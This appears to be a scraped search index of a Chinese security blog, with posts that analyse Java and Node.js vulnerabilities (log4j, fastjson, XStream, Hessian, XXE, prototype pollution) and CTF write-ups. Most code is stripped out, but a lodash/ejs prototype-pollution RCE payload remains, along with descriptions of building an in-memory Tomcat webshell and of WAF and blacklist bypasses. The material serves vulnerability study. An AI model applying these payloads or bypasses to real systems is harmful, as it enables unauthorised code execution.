[{"title":"Express+lodash+ejs原型链污染RCE","date":"2022-02-17T01:14:04.000Z","url":"/2022/02/17/loadsh+ejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","categories":[["nodejs","/categories/nodejs/"]],"content":"Express+lodash+ejs原型链污染RCElodash.defaultsDeep 方法造成的原型链污染（CVE-2019-10744）2019 年 7 月 2 日，Snyk 发布了一个高严重性原型污染安全漏洞（CVE-2019-10744），影响了小于 4.17.12 的所有版本的 lodash。 Lodash 库中的 defaultsDeep 函数可能会被包含 constructor 的 Payload 诱骗添加或修改Object.prototype 原型链-&gt;RCE简单的应用 断点res.render(‘index’);调试之后来到ejs库的compile函数 这里有个命令注入，outputFunctionName默认undefined，利用lodash.defaultsDeep污染outputFunctionName键，造成命令注入。 payload &#123;&quot;type&quot;:&quot;constructor&quot;,&quot;content&quot;:&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;open -a calculator&#39;);//&quot;&#125;&#125;&#125;&#125; 污染之后 post之后get访问/触发render "},{"title":"CVE-2022-21824-console.table原型链污染","date":"2022-02-16T11:14:04.000Z","url":"/2022/02/16/CVE-2022-21824/","categories":[["漏洞复现","/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"]],"content":"CVE-2022-21824这次Dice2022和vnctf2022都出了过相关的题目 描述 其实就是说console.table也能污染原型链了，但是危害很小，因为只允许将空字符串分配给对象原型的数字键。 本地调试之后，其实就是将Object.prototype[0]变成空字符 这样污染之后输出Object.prototype[0]就为空字符串而不是undefined VNCTF2022 newcalc0源码 有个vm2，也逃逸不了，利用上面的cve污染一下 满足flag路由的if(Object.keys(Object.prototype).length &gt; 0) console.table([&#123;&#125;], [&quot;__proto__&quot;]); 之后访问flag "},{"title":"log4j","date":"2022-02-15T01:14:04.000Z","url":"/2022/02/15/log4j/","categories":[["java","/categories/java/"]],"content":"前言这个漏洞杀伤力有目共睹。很感兴趣，拖了这么久来学习一下。 漏洞简介编号 CVE-2021-44228 Apache Log4j2是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。 漏洞适用版本为2.0 &lt;= Apache log4j2 &lt;= 2.14.1，只需检测Java应用是否引入log4j-core这个jar。若存在应用使用，极大可能会受到影响。 复现添加maven依赖 poc 顺带一题 logger组件的debug、info、warn、error、fatal方法都能触发 分析最后是在org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable方法进行lookup 调用栈，最先是调用了该类的replace方法进而到lookup payload的格式问题在这里就解答了，在MessagePatternConverter的format方法里，匹配到$&#123;则进行replace 需要了解下lo4j三大组件 Logger：日志记录器，负责收集处理日志记录 Appender：日志存放的地方，负责日志的输出 Layout：日志格式化，负责日志输出的形式 在调用栈里面我们也能具体看到三个组件 一个event Logger倒是很好理解，收集日志，poc起点就是这个组件，payload被这个组件收集。 之后是LoggerConfig.processLogEvent()用来处理日志事件，会调用callAppenders Appender主要将日志传送到输出目标，这里用的ConsoleAppender是输出到控制台 之后输出日志则需要用到layout组件，将日志encode了一下就去处理输出格式，问题出在输出格式的地方，回到刚刚上面我放的源码截图就知道，在format函数里匹配到$&#123;就去调用StringBuilder.append,里面调用上面提到的replace直到jndi注入 在我的理解看来就是： 调用error fatal这种函数尝试输出错误信息，logger负责收集事件，appender储存事件并指定输出，要么是控制台输出（Consoleappender）要么文件输出，layout就是具体负责输出的，但这中间有个输出格式处理，问题就出在格式处理这边，匹配到${就去jndi了 RC1绕过待补充"},{"title":"Dubbo HttpInvokerServiceExporter反序列化","date":"2022-02-13T11:14:04.000Z","url":"/2022/02/13/Dubbo%20HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[["java","/categories/java/"]],"content":"Dubbo HttpInvokerServiceExporter反序列化漏洞Dubbo简介Dubbo是阿里巴巴开源的基于 Java 的高性能 RPC(一种远程调用) 分布式服务框架(SOA)，致力于 提供高性能和透明化的RPC远程服务调用方案，以及SOA服务治理方案。dubbo 支持多种序列化方式并 且序列化是和协议相对应的。比如:Dubbo支持dubbo、rmi、hessian、http、webservice、thrift、 redis等多种协议。 环境搭建源码我这边环境是mac dubbo源码地址  git下来,我们只需要dubbo-samples-http这一个项目就够了，idea打开其pom.xml即可，但为了复现得改一下版本,在pom.xml里直接添加（为了测试漏洞） 注册中心安装zookeeper下载，不知道为什么国内镜像都挂了，这个下起来贼慢  解压后在conf文件夹创建zoo.cfg，在里面复制以下内容 之后按系统环境启动zkServer即可 漏洞复现漏洞编号CVE-2019-17564 影响版本 Apache Dubbo 2.7.0 to 2.7.4； Apache Dubbo 2.6.0 to 2.6.7； Apache Dubbo all 2.5.x； 运行HttpProvider，出现dubbo service started表示成功 yso生成payload 这里有个问题，直接生成再用bp导入还是会有编码问题 所以可以把payload base64编码一下 之后python写个发包 报错信息 起点是HttpServlet类的service方法 获取HttpHandler，若NULL则返回404，不为NULL则进入handle 获取uri，为POST方法则设置RPC服务，然后调用HttpInvokerServiceExporter类对象skeleton的handleRequest()函数进一步处理请求，这里Content-Type为application/x-java-serialized-object即Java序列化数据类型： 之后获取了POST的数据，进入handleRequest函数中，一路调用到doReadRemoteInvocation 然后对我们post的数据做java原生反序列化触发命令执行。 "},{"title":"PWN学习-栈溢出基础","date":"2022-02-09T01:14:04.000Z","url":"/2022/02/09/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/","categories":[["PWN","/categories/PWN/"]],"content":"栈溢出基础三个重要的寄存器 EBP : 用来存储当前函数状态的基地址, 在函数运行时不变, 可以用来索引确定函数参数或局部变量的位置 ESP : 用来存储函数调用栈的栈顶地址, 在压栈和退栈时发生变化 EIP : 用来存储即将执行的程序指令的地址, cpu 依照 EIP 的存储内容读取指令并执行, EIP 随之指向相邻的下一条指令 栈溢出原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变 用一张图概括就是 简单的例子 篡改返回地址为目的函数地址即可。 实践 上面这样一个c语言程序，success就是一个后门函数，我们通过栈溢出篡改返回地址为success。 编译一下 其中-m32是生成32位程序，-fno-stack-protector是不开启堆栈溢出的保护（不生成canary）-no-pie是关闭PIE。 没有canary和pie,开启了NX，NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 放IDA调试 看存在溢出的vulnerable函数，双击s 所以s字符串离当前的栈底有20个字节的距离。 success函数地址为804846B 我们利用gets溢出覆盖返回地址位success地址即可getshell 思路：先用20个字符填满s到ebp之间的内容，然后是4字节ebp的内容。 写EXP "},{"title":"Listener内存马","date":"2022-02-08T11:14:04.000Z","url":"/2022/02/08/Listener%E5%86%85%E5%AD%98%E9%A9%AC/","categories":[["java","/categories/java/"]],"content":"Listener内存马Tomcat中的Listener是用于监听web常见对象HttpServletRequest,HttpSession,ServletContext 1.监听web对象创建与销毁. 2.监听web对象的属性变化 3.监听session绑定javaBean操作. 监听ServletRequest 域对象的创建与销毁最方便触发使用 其实主要研究的就是不利用web.xml注册Listener的问题。 例如下面的例子 之后在web.xml中注册这个Listener 之后就可以执行任意命令  但在实战中肯定是不能修改web.xml的，得想别的办法注册Listener，首先需要捋清楚 Tomcat 中 Listener 的注册流程。 Tomcat有两个Listener接口，org.apache.catalina.LifecycleListener 和原生 java.util.EvenListener 。 org.apache.catalina.LifecycleListener多用于tomcat启动阶段，此时客户端还没解析，所以不适用。 ServletRequestListener接口继承自EvenListener，直接看其名字就知道是一个监听Servlet请求的Listener，可以拦截外部提交的参数，很适合做内存马。 注册流程在StandardContext#listenerStart方法里，根据名称实例化我们自定义的Listener 之后在该类的fireRequestInitEvent方法里调用Listener的requestInitialized方法 回到前面，看一下Listener的名称是这么来的 是findApplicationListeners方法的返回值，这个方法return了this.applicationListeners，是一个字符串数组，存放了自定义Listener的名称 Listener的名称是解析web.xml得来的，tomcat解析web.xml的过程我想之后再记一篇笔记。 之后是通过getApplicationEventListeners和setApplicationEventListeners方法将实例化的Listener存放在applicationEventListenersList数组中。 内存马编写所以流程就是 1.获取StandardContext对象 2.调用其addApplicationEventListener方法往applicationEventListenersList数组里添加我们实例化的Listener 关于第一步如何获取StandardContext 这篇参考文章总结的很全面  所以一个完整的Listener内存马 "},{"title":"CVE-2021-2471","date":"2022-02-08T01:14:04.000Z","url":"/2022/02/08/CVE-2021-2471/","categories":[["漏洞复现","/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"]],"content":"CVE-2021-2471 这个漏洞是由于MySQL JDBC 8.0.27版本之前，存在getSource()方法未对传入的XML数据做校验，导致攻击者可以在XML数据中引入外部实体，造成XXE攻击。 分析在com.mysql.cj.jdbc.MysqlSQLXML.getSource()方法里 看一下直接解析了xml数据没有过滤，看一下stringRep怎么来的。 在该类的setString方法赋值。调用之后正好将fromResultSet也变为false 复现SQLXML对象可以如此获得 POC 修复在8.0.27之后该漏洞就修复了 做了很多校验，没法任意解析xml数据了。"},{"title":"Hessian反序列化","date":"2022-02-07T01:14:04.000Z","url":"/2022/02/07/hessian%E5%8F%8D%E7%B3%BB%E5%88%97%E5%8C%96/","categories":[["java","/categories/java/"]],"content":"Hessian反序列化Hessian简介Hessian是二进制的web service协议，官方对Java、Flash/Flex、Python、C++、.NET C#等多种语言都进行了实现。Hessian和Axis、XFire都能实现web service方式的远程方法调用，区别是Hessian是二进制协议，Axis、XFire则是SOAP协议，所以从性能上说Hessian远优于后两者，并且Hessian的JAVA使用方法非常简单。它使用Java语言接口定义了远程对象，集合了序列化/反序列化和RMI功能。本文主要讲解Hessian的序列化/反序列化 反序列化过程下面参考链接对Hessian反序列化的流程写的非常的详细易懂。  不过我觉得有意思的是验证对象是否存在readResolve方法这个地方。 看参考文章里的链接描述是 验证时是先反序列化对象，之后查询该对象是否存在readResolve方法，如果有的话则调用并且似乎是直接释放了对象，没有的话则直接返回该对象。 比如我这样改 之后尝试调用方法则会报错 或者改成String类 则会这样报错 所以类的readResolve方法在hessian反序列化里还是很重要的。 gadgets现在网上一共有5条gadget RomeRome链是老熟人了，之前做ctf题遇到过。 不过这里起点都是相同的，终点则是com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData进行jndi注入 调用connect之后就是lookup然后jndi注入了 对着yso的链子写了个poc 大体上跟原来那个加载字节码的rome差不多，但仍有一些有意思的细节 实际上弹出了两个计算器 这是因为这一句 map.put(equalsBean,&quot;fmyyy&quot;); put调用key的hashCode也算是经典了。Rmoe链的起点就是如此，所以也算是完整的调用了一次链子。 还有一点就是这句 jdbcRowSet.setMatchColumn(&quot;foo&quot;); 注释掉该句之后则无法获取到getDatabaseMetaData方法 为此回去重新仔细跟了一次rome链子,他获取方法名的简单逻辑是匹配到该类setter，getter，is方法，若无参则调用。 但是getMatchColumnNames是在我们目标方法getDatabaseMetaData前一个调用，若strMatchColumns属性值为null则报错 跳出了循环，之后的方法无法执行，所以先调用其set方法给该属性赋值防止报错。 SpringPartiallyComparableAdvisorHolder待补充 Resin待补充"},{"title":"java反序列化脏数据绕waf的技巧","date":"2022-02-05T13:14:04.000Z","url":"/2022/02/05/java%E5%88%A9%E7%94%A8%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95waf/","categories":[["java","/categories/java/"]],"content":"java反序列化脏数据绕waf的技巧今天看Y4师傅发的一个trick，感觉很实用，所以来试一下。  原理就是找到一个类可以把脏数据和我们的gadget包在一起，这个类要实现Serializable接口和储存任意对象。 看要求，其实符合的类就很多了。 测试CC6.java(普通的cc6链子) DirtyDataWrapper.java 确实能够执行。 但也不是所有的集合类都合适，比如LinkedHashSet,HashSet，TreeSet等类就不适合，因为其数据结构有序，如果我们的gadget排在前面则仍可能被waf检测到。"},{"title":"XStream反序列化","date":"2022-02-03T13:14:04.000Z","url":"/2022/02/03/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[["java","/categories/java/"]],"content":"XStream反序列化前言 XStream的漏洞很多且中间过程复杂，我这里很简单的看了一下，心中有个概念，所以这篇文章没有任何参考价值。 XStreamXStream是Java类库，用来将对象序列化成XML(JSON)或反序列化为对象。 序列化和反序列化序列化：XStream.toXML() 反序列化： XStream.fromXML() 写一个接口 实现这个接口 序列化 结果: 反序列化 Converter转换器XStream是自己实现的一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换。 XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。 转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。 简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。 转换器需要实现3个方法： canConvert方法：告诉XStream对象，它能够转换的对象； marshal方法：能够将对象转换为XML时候的具体操作； unmarshal方法：能够将XML转换为对象时的具体操作； DynamicProxyConverterDynamicProxyConverter即动态代理转换器，是XStream支持的一种转换器，其存在使得XStream能够把XML内容反序列化转换为动态代理类对象 dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。 XStream反序列化漏洞原理XStream是自己实现的一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换，这便与原生的Java序列化和反序列化机制有所区别，因此两者的反序列化漏洞也是有着很大区别的。 XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。 基于sorted-set的PoC影响xstream版本 1.4.5，1.4.6，1.4.10 ![image-20220128142847518](/Users/fmyyy/Library/Application Support/typora-user-images/image-20220128142847518.png) EventHandler在XStream反序列化中，EventHandler类是一个很重要的类。这个类是InvocationHandler接口的实现类。 这个类中的两个属性 在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()调用链中，会将这两个属性作为类方法和参数继续反射调用，具体细节可以看源码。 com.thoughtworks.xstream.core.TreeUnmarshaller#start方法，通过readClassType根据payload里的标签获取了类，这里为java.util.SortedSet。 convertAnother()函数对java.util.SortedSet类型进行转换。 mapper.defaultImplementationOf()方法找到默认实现类进行了替换，这里为java.util.TreeSet 之后是converterLookup.lookupConverterForType()遍历所有转换器来寻找替换后的类即java.util.TreeSet的对应转换器。 ![image-20220128151735158](/Users/fmyyy/Library/Application Support/typora-user-images/image-20220128151735158.png) ![image-20220128151919540](/Users/fmyyy/Library/Application Support/typora-user-images/image-20220128151919540.png) 获取到了转换器，之后经过一些调用获取xml里标签和内容 看到获取到了动态代理标签，readItem()读取标签内容，在之后会如上面说的，访问到接口，触发了handler标签里的内容，我们这里handler标签为java.beans.EventHandler，之后反射命令执行。"},{"title":"羊城杯2020 A Piece Of Java","date":"2022-01-26T08:14:04.000Z","url":"/2022/01/26/%E7%BE%8A%E5%9F%8E2020APieceOfJava/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"[羊城杯 2020]A Piece Of Java源码逻辑不难，在hello对设置cookie键名为data进行反序列化 问题是用的是seriakiller进行的反序列化，并且用的白名单限制。 虽然题目自带了CC但是因为这个设置没法直接用。 看一下题目给的条件，有个InfoInvocationHandler 这个invoke肯定是能利用的，关键就在这 回到刚刚的hello路由，反序列化之后调用了info.getAllInfo() 再看给的DatabaseInfo类 所以思路很明确，利用动态代理触发InfoInvocationHandler的invoke方法，之后触发connect进行jdbc反序列化 调用链 这里最开始想的是利用恶意mysql读文件的，但貌似某个配置没开所以没成功。 写exp 恶意mysql和jdbc反序列化的利用参考 "},{"title":"SWPU2019-Web5","date":"2022-01-25T15:05:04.000Z","url":"/2022/01/25/SWPU2019Web5/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"[SWPU2019]Web5题目给了个导入导出通讯录的功能，导出为xlsx文件，所以猜测是解析excel引起的xxe 验证一下 对[Content_Types].xml写入poc之后再压缩回去 验证了xxe存在.无法直接读flag，利用java的file协议列目录，没回显的xxe。 evil.dtd内容 看到备份目录，下载。/ctffffff/backups/backup-af7f385c8840f173779124df915b6ebb.zip 读web.xml看到注册了FlagServlet，但没有权限读/flag 看到axis，查看其版本信息 该版本正好有个RCE CVE-2019-0227  这里的post请求包无法打通,因为这洞有前提条件，但xxe可以进行ssrf，尝试get的请求，用文章里第一个就行，路径得改成axis/shell.jsp 访问看见服务成功开启 然后post /axis/services/randomBBB(这里路径对应上面开启的服务名) "},{"title":"yaml反序列化-2","date":"2022-01-25T10:30:04.000Z","url":"/2022/01/25/yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962/","categories":[["java","/categories/java/"]],"content":"yaml反序列化-2 漏洞复现JdbcRowSetImpl经典的JdbcRowSetImpl肯定是可以打通的 ScriptEngineManagerScriptEngineManager类用于Java和JavaScript之间的调用。 SPI是Java提供的一套用来被第三方实现或者扩展的API，它可以用来启用框架扩展和替换组件。 当服务的提供者提供了一种接口的实现之后, 需要在classpath下 META-INF/services目录里创建一个以服务接口命名的文件, 文件内容为接口的具体实现类。当其他客户端程序需要这个服务的时候, 就可以通过查找 META-INF/services中的配置文件去加载对应的实现类。 复现写一个PoC类实现ScriptEngineFactory接口，一个static块执行命令。 根据SPI机制的描述，我们在PoC.class类的同级目录下创建文件夹，像这样 javax.script.ScriptEngineFactory内容为我们的类名（不加class） 在PoC.class所在当前目录开http服务 "},{"title":"yaml反序列化-1 yaml基础","date":"2022-01-19T17:05:04.000Z","url":"/2022/01/20/yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[["java","/categories/java/"]],"content":"yaml反序列化-1 yaml基础yaml简介YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。 在Java中，有一个用于解析YAML格式的库，即SnakeYaml。 SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。 影响版本全版本SnakeYaml 这里用 yaml语法大小写敏感 使用缩进代表层级关系（缩进只能用空格） 对象格式为 key: value 冒号之后有一个空格 一个短横线加一个空格代表一个数组项 还有一种结构为常量 包括：整数，浮点数，字符串，NULL，日期，布尔，时间。 SnakeYaml反序列化Yaml.load(): 参数为字符串或文件，反序列化返回一个java对象 Yaml.dump(): 将一个对象转为yaml文件形式 序列化： !!为强制类型转换为User类。 反序列化： 成功反序列化User对象。"},{"title":"java类加载机制","date":"2022-01-19T13:14:04.000Z","url":"/2022/01/19/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/","categories":[["java","/categories/java/"]],"content":"java类加载机制学到后面发现自己还是基础不扎实，回来重新学一下。 类加载机制Java虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这个过程被称作虚拟机的类加载机制。 主要过程就是：加载，验证，准备，解析，初始化,使用,卸载这7个阶段 类加载器主要来学一下类加载器。 简介虚拟机设计团队把类加载阶段中的“通过一个类的全限定名来获取描述此类的二进制字节流”这个动作放到Java虚拟机外部去实现，以便让应用程序自己决定如何去获取所需要的类。 实现这个动作的代码模块称为“类加载器”。 层次网上偷的图 双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器，通常使用组合（Composition）关系来复用父加载器的代码。 从Java虚拟机的角度来讲，只存在两种不同的类加载器：一种是启动类加载器（Bootstrap ClassLoader），这个类加载器使用C++语言实现，是虚拟机自身的一部分；另一种就是所有其他的类加载器，这些类加载器都由Java语言实现，独立于虚拟机外部，并且全都继承自抽象类java.lang.ClassLoader。 Java 中使用的默认类加载器有以下三种：Bootstrap 类加载器、Extension 类加载器和 System/Application 类加载器。每个类加载器都有一个预定义的位置，它们在预定义的位置加载类文件。 **BootStrap ClassLoader(引导类加载器)：**主要加载 %JDK_HOME%\\jre\\lib 下的 rt.jar、resources.jar、charsets.jar 和 class 等 JDK 类文件，可以通 System.getProperty(“sun.boot.class.path”) 查看加载的路径。Bootstrap 类加载器是所有类加载器的父加载器，它没有任何父加载器。 **Extension ClassLoader(扩展类加载器)：**主要加载目录 %JDK_HOME%\\jre\\lib\\ext 目录下的 jar 和 class 文件，可以通过 System.getProperty(“java.ext.dirs”) 查看加载类文件的路径。Extension 类加载器将加载类的请求先委托给它的父加载器，也就是 Bootstrap，如果没有成功加载的话，再从 jre/lib/ext 目录下或者 java.ext.dirs 系统属性定义的目录下加载类。Extension 加载器由 sun.misc.Launcher$ExtClassLoader 实现。 **System ClassLoader(系统类加载器)：**又叫作 Application 类加载器，它负责从 classpath 环境变量中加载某些应用相关的类，classpath 环境变量通常由 -classpath 或 -cp 命令行选项来定义，或者是 JAR 中的 Manifest 的 classpath 属性。Application 类加载器是 Extension 类加载器的子加载器，通过 sun.misc.Launcher$AppClassLoader 实现。 ExtClassLoader 和 AppClassLoder 继承 URLClassLoader，URLClassLoder继承自ClassLoder，又如上面所说，Bootstrap ClassLoader这个加载器是用C++语言实现，是虚拟机的一部分，不继承自任何类。 类加载的方式 命令行启动应用时候由JVM初始化加载 通过Class.forName()方法动态加载 通过ClassLoader.loadClass()方法动态加载 Class.forName()和ClassLoader.loadClass()两者都会把类的.class加载到jvm中，两者主要区别就是Class.forName()会执行类的static块。，而ClassLoader.loadClass()则不会，但Class.forName()也有可控参数控制是否加载static块。 可以测试一下 这里的获得的类加载器为AppClassLoader Lanucher是入口，放一下Launcher的部分关键源码 在开头执行了System.getProperty(&quot;sun.boot.class.path&quot;) 所以从源码可以看出JVM类加载器的顺序为BoopStrap ClassLoder -&gt; ExtClassLoader -&gt; AppClassLoder。 类加载器的父加载器ClassLoader类有个getParent方法用于获得类加载器的父加载器 不为null则返回parent属性，看看这个属性是怎么来的。 是在ClassLoader的构造函数里来的，也就是说这是可控的。 AppClassLoader和ExtClassLoader都继承自URLClassLoader，但不表明他们的父加载器就是URLClassLoader，父加载器不等同于父类。 回到我们刚刚的测试源码测试一下就知道。 看到AppClassLoader的父加载器不是其父类URLClassLoader而是ExtClassLoader，这应该是在加载时在Launcher里指定的。 双亲委派某个特定的类加载器在接到加载类的请求时，首先将加载任务委托给父类加载器，依次递归，如果父类加载器可以完成类加载任务，就成功返回；只有父类加载器无法完成此加载任务时，才自己去加载。 使用双亲委派模型的好处在于Java类随着它的类加载器一起具备了一种带有优先级的层次关系。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。"},{"title":"解析excel文件引起的xxe","date":"2022-01-18T13:14:04.000Z","url":"/2022/01/18/%E8%A7%A3%E6%9E%90excel%E5%BC%95%E8%B5%B7%E7%9A%84xxe/","categories":[["java","/categories/java/"]],"content":"解析excel文件引起的xxe老洞了 分析复现一下。 编号 CVE-2014-3529 需要poi-ooxml-3.10-FINAL.jar以下版本 复现Microsoft Office 从 2007 版本引入了新的开放的 XML 文件格式，新的 XML 文件格式基于压缩的 ZIP 文件格式规范，由许多部分组成。 把一个excel文件解压就能看到。 对[Content_Types].xml写入poc之后再压缩回去 分析肯定是在解析xml文件时出了问题。 在getPartsImpl()方法里 \u0001 对excel文件解析之后匹配到[Content_Types].xml之后将数据流作为ZipContentTypeManager这个类构造函数的参数 进入ContentTypeManager方法之后调用parseContentTypesFile 该方法对xml数据没有作任何的过滤直接解析导致了xxe"},{"title":"CVE-2019-14439以及[NPUCTF2020]EzShiro复现","date":"2021-12-22T05:14:04.000Z","url":"/2021/12/22/CVE-2019-14439/","categories":[["java","/categories/java/"]],"content":"CVE-2019-14439以及[NPUCTF2020]EzShiro复现CVE-2019-14439是由logback 引起的 jndi 注入，找不到详细分析的文章，对着网上的poc简单看了一下。 在ch.qos.logback.core.db.JNDIConnectionSource这个类里 漏洞原理并不复杂，很清晰明了的jndi注入。 poc [NPUCTF2020]EzShiro一开始没做出来，后来看wp知道附件有pom.xml buu似乎没给 看到有logback 先是shiro的权限绕过来到/json。访问/;/json post一个true看到Jackson jackson+logback 应该就是CVE-2019-14439了,源码应该是用jackson对post的json数据进行反序列化 但遇到个问题，我直接打没有打通，这里好像还需要绕限制。 看了看wp，参考的是这个。文章里有提到  应该是题目jvm版本太高了。得加载题目自带的链子，看到pom里有commons-collections wp里直接用ysomap工具了，还没在比赛里用过这个工具，顺带学一学。  使用这工具必须的是jdk8，并且jdk8版本不能过低 能弹成功，期末考完去研究一下工具源码"},{"title":"2021安洵杯ezjson-wp","date":"2021-12-02T01:14:04.000Z","url":"/2021/12/02/2021%E5%AE%89%E6%B4%B5%E6%9D%AFezjson-wp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"ezjson比赛只做了前两道web，这道题没去看了，因为当时看做出来的人不多就去复习了，今天有空看一下题。 fd文件可以泄露 jar文件下到源码。题目环境不出网没法jndi。但题目本身留了加载字节码后门。 fastjson版本1.2.47,有个通杀payload 这里调用到App.Exec的getFlag即可， 这里可以用$ref调用任意的get  为了回显，字节码用老熟人spring通用回显 这里还要绕关键字 fastjson有个特性，遇到\\x和\\u就会解码，所以十六进制绕过 exp s"},{"title":"fastjson反序列化 1.2.22-1.2.47","date":"2021-11-25T01:14:04.000Z","url":"/2021/11/25/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[["java","/categories/java/"]],"content":"fastjson反序列化 1.2.22-1.2.47漏洞原理fastjson支持使用@type指定反序列化的目标类，如下演示： EvilClac.java Calc.java 结果： 当未对@type字段进行完全的安全性验证，攻击者可以传入危险类，从而调用危险类对目标机进行攻击。 1.2.22-1.2.24JdbcRowSetImpl适用fastjson版本1.2.22-1.2.24 配合之前的jndi注入 fastjson在序列化时会调用类中各属性的get方法，而反序列化时会调用其set方法。利用点就在set方法里面 这样直接跟下来逻辑还是很明确的，在最后的connect方法lookup了dataSource，dataSource是我们设置的dataSourceName，为我们的恶意rmi服务。所以我们利用set造成jndi注入进行rce。 1.2.24-1.2.47在1.2.25以上的版本中，使用上面的链子会报错 提示autoType is not support. com.sun.rowset.JdbcRowSetImpl 因为加了黑名单和白名单 不仅如此，fastjson还默认关闭了反序列化任意类的操作，需要手动开启才行。 1.2.24-1.2.48这些版本中陆陆续续出现了绕过和针对绕过的补丁然后继续绕过。 1.2.42修复前看到白名单判断的TypeUtils.loadClass里面 如果开头为 [ 或者开头为 L 结尾为 ; 会去掉这些字符之后再加载，再看下面黑名单 判断是否在黑名单内的方法为startsWith，所以绕过方式显而易见 再原来的com.sun.rowset.JdbcRowSetImpl前面加上L后面加上;即可（用 [。的话会解析错误） 之后给1.4.42打了个很愚蠢的补丁 修复后 大致意思就是，假如开头和结尾是L和;就将头和尾去掉，再进行黑名单验证 还将之前的黑名单验证变成了hash的方式，防止安全人员进行研究 再加一层L和;就可以了。 1.2.43对前面嵌套两层的绕过方式做了一个简单粗暴的修复 连续出现两个 L 直接报错。 这个版本的payload 1.2.45这也不能算绕过，应该算是另一条利用链。 需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本 这里我用的3.4.6 payload 在其set方法中 lookup了data_source,且该类本身不在黑名单中，所以绕过。 1.2.25-1.2.47通杀（无需开启AutoTypeSupport） 测试后均可用。 最近太忙了，之后学习一下原理"},{"title":"2021西湖论剑web部分wp","date":"2021-11-21T04:14:04.000Z","url":"/2021/11/21/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web%E9%83%A8%E5%88%86wp/","categories":[["CTFwp","/categories/CTFwp/"]],"content":"2021西湖论剑web部分wpOA?RCE?环境没有写的权限，本地有打通环境打不通的情况很多 之后在webmain/index/indexAction.php处 有个包含任意php文件 有个查看phpinfo的 看了之后开着register_argc_argv，尝试包含pearcmd payload 第一步 第二步 4.php内容为 easyupload?source=1看到源码能上传文件有一些限制 文件名不能有p和h，而且内容长度不超过28。可以上传.user.ini，因为长度不超过28，可以为auto_prepend_file=”/flag”使其自动包含/flag，之后找到一个php文件访问就行。看latte模版会生成一个php缓存文件，且文件生成规则如上图，每个版本文件名固定。本地搭环境(要在linux)，去github上找latte测试。简单看一下 